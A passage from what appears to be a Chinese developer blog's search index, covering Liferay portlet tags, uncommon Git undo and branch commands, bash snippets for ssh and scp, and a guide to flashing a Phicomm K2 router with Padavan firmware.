class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>renderURL：提交到 <a href="#doView"><code>doView</code></a> 方法</p> <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 引用 renderURL 标签--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">portlet:</span>renderURL</span> <span class="token attr-name">var</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>updateURL<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%updateURL%&gt;<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--  --&gt;</span>    用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;portlet:namespace/&gt;uName<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p><a href="#namespace"><font color="#FF6655">注意 name 属性需要添加 namespace 属性</font></a>，否则后台取不到值<br>配置 <a href="#liferay-portlet.xml"><code>&lt;requires-namespaced-parameters&gt;</code></a> 属性为 false，则不需要添加 namespace 属性</p></blockquote><br><h2 id="Portlet-标签"><a href="#Portlet-标签" class="headerlink" title="Portlet 标签"></a>Portlet 标签</h2><h3 id="defineObjects"><a href="#defineObjects" class="headerlink" title="defineObjects"></a>defineObjects</h3><p>引入该标签后可以调用 Portlet 中的默认对象</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;portlet:defineObjects&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>renderRequest</li><li>actionRequest</li><li>…</li></ul><br><h3 id="请求类标签"><a href="#请求类标签" class="headerlink" title="请求类标签"></a>请求类标签</h3><h4 id="renderURL"><a href="#renderURL" class="headerlink" title="renderURL"></a>renderURL</h4><p>用于提交表单，类似 Get 请求</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;portlet:renderURL var="updateURL"&gt;    &lt;!-- 添加值为 "sss" 的参数 updateParm --&gt;    &lt;portlet:param name="updateParm" value="sss"/&gt;    &lt;!-- 跳转页面 --&gt;    &lt;portlet:param name="jspPage" value="/html/hello/edit.jsp"/&gt;&lt;/portlet:renderURL&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>示例可以参考 <a href="#%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95">liferay 提交表单</a></p></blockquote><br><h4 id="actionURL"><a href="#actionURL" class="headerlink" title="actionURL"></a>actionURL</h4><p>用于提交表单，类似 Post 请求</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;portlet:actionURL var="updateForm" name="update"&gt;    &lt;!-- 添加值为 "sss" 的参数 updateParm --&gt;    &lt;portlet:param name="updateParm" value="sss"/&gt;&lt;/portlet:actionURL&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>示例可以参考 <a href="#%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95">liferay 提交表单</a></p></blockquote><br><h4 id="resourceURL"><a href="#resourceURL" class="headerlink" title="resourceURL"></a>resourceURL</h4><p>用于资源传输类请求</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;portlet:resourceURL&gt;    &lt;!-- 添加值为 "sss" 的参数 updateParm --&gt;    &lt;portlet:param name="updateParm" value="sss"/&gt;&lt;portlet:resourceURL&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="param"><a href="#param" class="headerlink" title="param"></a>param</h3><p>该标签无法单独使用，需要配合<a href="#%E8%AF%B7%E6%B1%82%E7%B1%BB%E6%A0%87%E7%AD%BE">请求类标签</a>使用</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;portlet:param name="" value=""/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;portlet:namespace/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>避免多个相同的 portlet 表单冲突，因为 portlet 可以设置为一个页面显示多个，它会为每个 name 生成一个唯一编码，该编码还可以用到各种地方：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>    <span class="token keyword">function</span> <span class="token operator">&lt;</span>portlet<span class="token operator">:</span>namespace<span class="token operator">/</span><span class="token operator">&gt;</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">...</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;button onclick="&lt;portlet:namespace/&gt;save()"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><font color="#FF6633">如果设置了 <a href="#liferay-portlet.xml"><code>&lt;instanceable&gt;true&lt;/instanceable&gt;</code></a> 属性请不要设置 <a href="#liferay-portlet.xml"><code>&lt;requires-namespaced-parameters&gt;</code></a> 为 false</font>, 避免实例化多个 portlet 之后无法取到值</p></blockquote><br><h3 id="iferay-theme-defineObjects"><a href="#iferay-theme-defineObjects" class="headerlink" title="iferay-theme:defineObjects"></a>iferay-theme:defineObjects</h3><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;liferay-theme:defineObjects&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="property"><a href="#property" class="headerlink" title="property"></a><del>property</del></h3><p><code>&lt;portlet:property&gt;</code> 标签虽然在 portlet 里有定义但是在 liferay 中没有用到</p><br><h2 id="地址参数解析"><a href="#地址参数解析" class="headerlink" title="地址参数解析"></a>地址参数解析</h2><ul><li>p_p_id: portlet id<ul><li>如果该 portlet 允许实例化多次(<code>&lt;instanceable&gt;</code>)则结尾会有实例化 id</li></ul></li><li>p_p_lifecycle: 请求类型<ul><li>0: RenderRequest, 相当于 Get</li><li>1: ActionRequest, 相当于 Post</li></ul></li><li>p_p_state: 状态<ul><li>normal: 正常</li><li>maximized: 最大化</li><li>minimized: 最小化</li><li>pop_up: 不显示头尾模式，用于弹窗</li><li>EXCLUSIVE:</li></ul></li></ul><br><h2 id="Portlet-之间的通信"><a href="#Portlet-之间的通信" class="headerlink" title="Portlet 之间的通信"></a>Portlet 之间的通信</h2><br><h3 id="PortletSession"><a href="#PortletSession" class="headerlink" title="PortletSession"></a>PortletSession</h3><br><h3 id="Portlet-URL-调用"><a href="#Portlet-URL-调用" class="headerlink" title="Portlet URL 调用"></a>Portlet URL 调用</h3><br><h3 id="Public-render-parameters"><a href="#Public-render-parameters" class="headerlink" title="Public render parameters"></a>Public render parameters</h3><br><h3 id="Portlet-events"><a href="#Portlet-events" class="headerlink" title="Portlet events"></a>Portlet events</h3><br><h3 id="通过-URL-传参"><a href="#通过-URL-传参" class="headerlink" title="通过 URL 传参"></a>通过 URL 传参</h3>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Liferay </tag>
            
            <tag> Portlet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不常用的 Git 命令</title>
      <link href="/2018/04/05/gitcommands/"/>
      <url>/2018/04/05/gitcommands/</url>
      
        <content type="html"><![CDATA[<p>虽然现在有很多 Git 图形化工具，但是它们都有一个共通的缺点：功能不全。</p><p>所以有时候遇到一些棘手问题，是无法通过图形化工具来解决的，这时候就只能使用命令行来解决了。</p><span id="more"></span><h2 id="Git-撤销"><a href="#Git-撤销" class="headerlink" title="Git 撤销"></a>Git 撤销</h2><h3 id="撤销-add-的文件"><a href="#撤销-add-的文件" class="headerlink" title="撤销 add 的文件"></a>撤销 add 的文件</h3><p>有时候，我们会不小心 add 了不想添加的文件，或者 add 之后后悔了，此时就需要对 add 的文件进行撤销了</p><ol><li><p>查看状态，看看 add 的文件有哪些</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="http://wx4.sinaimg.cn/large/a6e9cb00ly1fqvmara03jj210y0qik2x.jpg" alt="查看状态" title="撤销前的状态"></p></li><li><p>撤销</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset HEAD <span class="token comment">#将最后一个版本之后添加的文件全部撤销为未添加状态</span><span class="token function">git</span> reset XXX/XXX/XXX.java <span class="token comment">#对指定的已添加某个文件进行撤销</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <img src="http://wx4.sinaimg.cn/large/a6e9cb00ly1fqvmlmug4zj21080pon7q.jpg" alt="查看状态" title="撤销后的状态"></p></li></ol><blockquote><p>此操作只适用于 add 后、commit 前的文件</p></blockquote><br><h3 id="撤销-commit-的文件"><a href="#撤销-commit-的文件" class="headerlink" title="撤销 commit 的文件"></a>撤销 commit 的文件</h3><p>不小心 add 的文件其实影响不大，更常出现的情况是不小心把错误的文件或不应该提交的文件给提交了</p><p>遇到这种情况，在图形化界面的操作往往是迅速修改为正确的文件再提交一下，或者把不应该提交的文件删除掉再提交一遍然后本地再添加一下不该提交的文件(累不累…)</p><p>但是，如果这样做的话在版本记录中还是会留下痕迹的。此时如果用命令行进行撤销的话就不会在版本中留下记录了</p><ol><li>查看提交记录 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre> <img src="http://wx3.sinaimg.cn/large/a6e9cb00ly1fqvoh546bbj20uu0g8tfo.jpg" alt="提交记录" title="撤销前的提交记录"><blockquote><p><code>git log</code> 界面中按 <code>q</code> 退出</p></blockquote></li><li>撤销最后一次提交的内容 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 保留当前修改</span><span class="token function">git</span> reset 上一次的提交 <span class="token function">id</span><span class="token comment"># 抛弃当前修改，完全回到上个版本的状态</span><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> 上一次的提交 <span class="token function">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre> <img src="http://wx3.sinaimg.cn/large/a6e9cb00ly1fqvomg7zpyj20wy05utbq.jpg" alt="撤销提交内容" title="撤销最后一次提交"></li><li>提交正确内容 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> xxx<span class="token function">git</span> commit -<span class="token string">'xxx'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre> <img src="http://wx4.sinaimg.cn/large/a6e9cb00ly1fqvovt12fgj20v80g4trf.jpg" alt="提交记录" title="撤销后的提交记录"></li></ol><blockquote><p>此操作只适用于 commit、push 前的文件，即撤销本地提交的内容</p></blockquote><br>### 撤销 push 的文件<p>还有一种情况，push 到远端后发现 commit 了多余的文件，或者希望远端也能够回退到以前的版本</p><p>此时就需要撤销远端的提交记录了</p><ol><li>先在<a href="">本地回退到相应的版本</a></li><li>强制 push 覆盖掉远程仓库，使远程仓库也回退到相应版本 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push origin 分支名 <span class="token parameter variable">--force</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果此时只使用 <code>git push origin 分支名</code> 则会因为本地版本落后于远程仓库版本而报错<br>远端撤销就不再截图了，感兴趣的自行尝试吧</p></blockquote></li></ol><br>## 合并指定文件或文件夹<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout 分支名 目标文件夹或目标文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## 忽略本地文件修改<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> update-index --assume-unchanged build/conf/a.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>需要提前设置好默认编辑器</p></blockquote><p>想要恢复的话执行如下命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> update-index --no-assume-unchanged build/conf/a.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>build/conf/a.conf</code> 为想要忽略改动的文件</p></blockquote><p>使用如下命令可以查看当前被忽略修改的本地文件列表:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> ls-files <span class="token parameter variable">-v</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-e</span> <span class="token string">"^[hsmrck]"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## 想撤销中间某次提交<blockquote><p>使用 <code>revert</code> 命令，而不是 <code>reset</code><br><code>git reset –hard commit_id</code> 虽然可以回退远程库，但是其要求 <code>pull</code> 最新代码的每个人的本地分支都要进行版本回退</p></blockquote><h3 id="正确的步骤："><a href="#正确的步骤：" class="headerlink" title="正确的步骤："></a>正确的步骤：</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> revert commit_id<span class="token comment"># 如果 commit_id 是 merge 节点的话, -m 是指定具体哪个提交点</span><span class="token function">git</span> revert commit_id <span class="token parameter variable">-m</span> <span class="token number">1</span><span class="token comment"># 接着就是解决冲突</span><span class="token function">git</span> <span class="token function">add</span> <span class="token parameter variable">-A</span><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">".."</span><span class="token function">git</span> revert commit_id <span class="token parameter variable">-m</span> <span class="token number">2</span><span class="token comment"># 接着就是解决冲突</span><span class="token function">git</span> <span class="token function">add</span> <span class="token parameter variable">-A</span><span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">".."</span><span class="token function">git</span> push<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>其中 <code>git revert commit_id -m 数字</code> 是针对 <code>merge</code> 提交点的操作</p></blockquote><br>## 修改远程默认分支<p>远程默认分支初始是 master</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 登录到远程 git 库所在的服务器</span><span class="token function">ssh</span> root@192.168.1.1<span class="token comment"># 创建临时目录(默认你已经有其他分支了)</span><span class="token function">mkdir</span> tmp<span class="token comment"># 检出另一个分支并将该分支作为默认分支</span><span class="token function">git</span> --git-dir<span class="token operator">=</span>./Project --work-tree<span class="token operator">=</span>./tmp checkout 分支名<span class="token comment"># 查看分支</span><span class="token function">git</span> branch <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## 删除远程 master 分支<p>因为 master 分支是默认分支，所以直接使用 <code>git branch -d master</code> + <code>git push origin :master</code> 无法删除远程 master 分支</p><p>所以想要删除远程 master 分支就要先<a href="#%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E9%BB%98%E8%AE%A4%E5%88%86%E6%94%AF">修改默认分支</a></p><p>然后再使用那两个命令删除 master 分支就可以了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch <span class="token parameter variable">-d</span> master<span class="token function">git</span> push origin :master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="查看分支时报错"><a href="#查看分支时报错" class="headerlink" title="查看分支时报错"></a>查看分支时报错</h4><p>删除远程分支后再查看分支报错了: <code>warning: ignoring broken ref refs/remotes/origin/HEAD warning: ignoring broken ref refs/remotes/origin/HEAD</code></p><p>可以使用如下命令检查状态:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> symbolic-ref refs/remotes/origin/HEAD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用如下命令修复该问题:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/分支名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将<code>分支名</code>替换为您希望 HEAD 指向的分支的名称</p><hr><p>感谢阅读，如有其它想知道的内容欢迎留言，此文会不定期更新</p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 版本控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bash 常用命令</title>
      <link href="/2018/03/13/shellcommoncommands/"/>
      <url>/2018/03/13/shellcommoncommands/</url>
      
        <content type="html"><![CDATA[<p>有时候一些简单的操作用不到复杂的编程语言，只需要几行 Shell 命令就搞定了</p><p>完全没必要用 Java 写，省时省事，何乐不为呢？</p><span id="more"></span><h2 id="Shell-中将数字转为字符串并在前面补零"><a href="#Shell-中将数字转为字符串并在前面补零" class="headerlink" title="Shell 中将数字转为字符串并在前面补零"></a>Shell 中将数字转为字符串并在前面补零</h2><h3 id="示例：生成指定范围内的随机时间"><a href="#示例：生成指定范围内的随机时间" class="headerlink" title="示例：生成指定范围内的随机时间"></a>示例：生成指定范围内的随机时间</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">function</span> <span class="token function-name function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token assign-left variable">min</span><span class="token operator">=</span><span class="token variable">$1</span>    <span class="token assign-left variable">max</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$<span class="token number">2</span><span class="token operator">-</span>$min<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>    <span class="token comment">#增加一个 10 位的数再求余</span>    <span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$RANDOM<span class="token operator">+</span><span class="token number">1000000000</span><span class="token variable">))</span></span>    <span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">$((</span>$num<span class="token operator">%</span>$max<span class="token operator">+</span>$min<span class="token variable">))</span></span><span class="token punctuation">}</span><span class="token assign-left variable">day</span><span class="token operator">=</span><span class="token string">'2018-03-13'</span><span class="token comment"># 时分秒字符串（两位数字）</span><span class="token assign-left variable">hh</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token number">8</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{printf("%02d\n",$0)}'</span><span class="token variable">`</span></span><span class="token assign-left variable">mm</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token punctuation">$(</span>rand <span class="token number">0</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{printf("%02d\n",$0)}'</span><span class="token variable">`</span></span><span class="token assign-left variable">ss</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token punctuation">$(</span>rand <span class="token number">0</span> <span class="token number">59</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{printf("%02d\n",$0)}'</span><span class="token variable">`</span></span><span class="token builtin class-name">echo</span> <span class="token variable">$day</span> <span class="token variable">$hh</span><span class="token builtin class-name">:</span><span class="token variable">$mm</span><span class="token builtin class-name">:</span><span class="token variable">$ss</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="登陆-Linux-服务器"><a href="#登陆-Linux-服务器" class="headerlink" title="登陆 Linux 服务器"></a>登陆 Linux 服务器</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> username@ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Linux-文件传输"><a href="#Linux-文件传输" class="headerlink" title="Linux 文件传输"></a>Linux 文件传输</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将本地文件上传到服务器的目的路径</span><span class="token function">scp</span> <span class="token parameter variable">-P</span> 端口号 本地文件路径 username@服务器 ip:目的路径<span class="token comment"># 将服务器上目的路径的文件下载到本地路径</span><span class="token function">scp</span> <span class="token parameter variable">-P</span> 端口号 username@ip:路径 本地路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 补位 </tag>
            
            <tag> 赋值 </tag>
            
            <tag> Command </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K2 最新版固件刷华硕老毛子</title>
      <link href="/2018/03/02/k2topadvan/"/>
      <url>/2018/03/02/k2topadvan/</url>
      
        <content type="html"><![CDATA[<p>去年通过斐讯 0 元购入手了 K2 路由器，用着还不错吧，前几天又通过 0 元购入手了 K3 路由器，然后 K2 就打算刷个能翻墙的系统玩了，就算刷成砖了也无所谓啦，反正是白给的，哈哈。</p><span id="more"></span><h2 id="需要的工具"><a href="#需要的工具" class="headerlink" title="需要的工具"></a>需要的工具</h2><ul><li>斐讯 K2 路由器一台</li><li><a href="https://pan.baidu.com/s/1slqkvF3">斐讯 K2 V22.6.506.28 官方固件</a> —— 2a2n</li><li><a href="http://pan.baidu.com/s/1slym23j">路由器刷 breed Web 控制台助手 v4.8 版本.7z</a> —— 其中包括：<ul><li>路由器刷 breed Web 助手通用版 v4.8.exe —— 主程序</li><li>breed Web 懒人工具.exe —— 小白操作 breed 刷机工具（1.3 版本）</li><li>plink.exe —— telnet_ssh 终端</li><li>MyWebServer.exe —— HTTP 服务（用于架设 breed 本地服务器）</li><li>RoutAck.exe —— 坛友 phitools 开发的斐讯激活 Telnet 利器</li></ul></li><li><a href="https://pan.baidu.com/s/1pNr9Soz">breed Web 懒人工具 v1.4.7z</a></li><li><a href="https://pan.baidu.com/s/1c1FuPDA">RoutAckProV1B2.rar</a> —— 4egk</li><li>华硕老毛子 Padavan 固件 —— <a href="https://eyun.baidu.com/s/3pLMbUqR">官方最新版固件</a><ul><li>下载老毛子固件时应选择对应 K2 路由器型号的版本 —— 即包含 <code>PSG1218</code> 的固件</li><li><code>RT-AC54U-GPIO-1-PSG1218-256M_x.x.x.x-xxx.trx</code></li><li><code>RT-AC54U-GPIO-1-PSG1218-64M_x.x.x.x-xxx.trx</code></li></ul></li></ul><blockquote><p>写这篇文章时最新版固件为 <code>22.6.5.7.43</code>，所以需要降级才能刷机</p></blockquote><br>## 刷机<p><font color="#dd3333">整个过程路由器都是联网状态（Wan 口），并且用网线连着路由器和电脑（随便一个 Lan 口）</font></p><h3 id="1-替换-breed-Web-懒人工具版本"><a href="#1-替换-breed-Web-懒人工具版本" class="headerlink" title="1.替换 breed Web 懒人工具版本"></a>1.替换 breed Web 懒人工具版本</h3><p>上面下载的 breed web 控制台助手 4.8 版本中所包含的 breed Web 懒人工具是 1.3 版本的，要把它换成最新版的</p><ol><li>解压 <a href="http://pan.baidu.com/s/1slym23j">路由器刷 breed Web 控制台助手 v4.8 版本.7z</a></li><li>删除 <code>路由器刷 breed Web 控制台助手 v4.8 版本</code> 中的 <code>breed Web 懒人工具.exe</code></li><li>解压 <a href="https://pan.baidu.com/s/1pNr9Soz">breed Web 懒人工具 v1.4.7z</a> 到 <code>路由器刷 breed Web 控制台助手 v4.8 版本</code> 中，全部覆盖</li><li>将 <code>路由器刷 breed Web 控制台助手 v4.8</code> 中的 <code>breed Web 懒人工具 v1.4 版本.exe</code> 重命名为 <code>breed Web 懒人工具.exe</code></li></ol><br>### 2.路由器固件降级<ol><li>登陆路由器管理界面（默认 192.168.2.1）&gt; 打开功能管理 &gt; 系统管理 &gt; 手动升级</li><li>选择 <a href="https://pan.baidu.com/1slqkvF3">斐讯 K2 V22.6.506.28 官方固件</a> 进行降级，降级后会自动重启路由器</li><li>再次登录路由器 &gt; 打开功能管理 &gt; 系统管理 &gt; 备份恢复 &gt; 恢复出厂设置，等待路由器重启完毕</li><li>打开 <code>192.168.2.1</code> 快速设置路由器，管理员密码设置为 admin（只是为了方便）</li></ol><blockquote><p>提示升级固件时请选择 否</p></blockquote><br>### 3.打开路由器 Telnet<ol><li><p>解压 <a href="https://pan.baidu.com/s/1c1FuPDA">RoutAckProV1B2.rar</a></p></li><li><p>打开 <code>RoutAckProV1B2.exe</code></p></li><li><p>点击 <code>打开 Telnet</code> 按钮</p></li><li><p>若打开失败，请重新执行<a href="#2-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E9%99%8D%E7%BA%A7">路由器降级的第 3、4 步操作</a>后再次尝试</p><p> <img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fozktyl9gbj20a308rt93.jpg" alt="打开 Telnet"></p></li></ol><br>### 4.刷入 breed Web 控制台助手<ol><li><p>以管理员身份运行 <code>路由器刷 breed Web 控制台助手 v4.8 版本.exe</code></p></li><li><p>设置刷机方案为 <code>斐讯[K1/K2]自动 MTK 方案</code>，密码若没修改则默认即可</p></li><li><p>点击 <code>开始刷机</code></p><p> <img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fozkun2xd5j20bf0fmq3b.jpg" alt="刷入 breed Web 控制台助手"></p></li></ol><br>### 5.刷入固件<ol><li>上一步成功后会自动提示进入 <code>懒人刷固件</code> 模式，选择 <code>是</code></li><li>自动打开 <code>breed Web 懒人工具</code> 后选点击 <code>自选文件</code> 选择想要刷入的固件<blockquote><p>我使用的是 3 月 2 日发布的 <code>RT-AC54U-GPIO-1-PSG1218-256M_3.4.3.9-099.trx</code></p></blockquote></li><li>确认状态提示为<font color="#EE3333">未进入 breed Web 模式，正在探测 breed Web 模式中……</font><ul><li>如果不是该状态，请勾选上面的 <code>自动探测...</code><br> <img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fozktywxyej20bz0bi74c.jpg" alt="刷入固件"></li></ul></li><li>拔下路由器电源</li><li>按住路由器背面的 <code>reset</code> 按钮不松手</li><li>接通路由器电源，此时 <code>reset</code> 按钮在通电后继续按住 10 秒</li><li><code>breed Web 懒人工具</code> 状态有变化后点击 <code>开始刷机</code></li><li>等待结束后就成功啦！</li></ol><blockquote><p>注意此时路由器管理页面 ip 地址改为 <code>192.168.123.1</code> 了</p></blockquote><br>## 科学上网<p>根据自身情况设置 VPN 或者 ShadowSocks 即可</p><p>我用的是 ShadowSocks，配置如图：</p><p><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fozmout772j21k03744qp.jpg" alt="ShadowSocks 设置"></p><h2 id="最终效果图"><a href="#最终效果图" class="headerlink" title="最终效果图"></a>最终效果图</h2><p><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00ly1fozml9if9dj21ho1fctog.jpg" alt="最终效果"></p>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器 </tag>
            
            <tag> 科学上网 </tag>
            
            <tag> 老毛子 </tag>
            
            <tag> 刷机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 批量视频转换</title>
      <link href="/2018/02/06/convertvideos/"/>
      <url>/2018/02/06/convertvideos/</url>
      
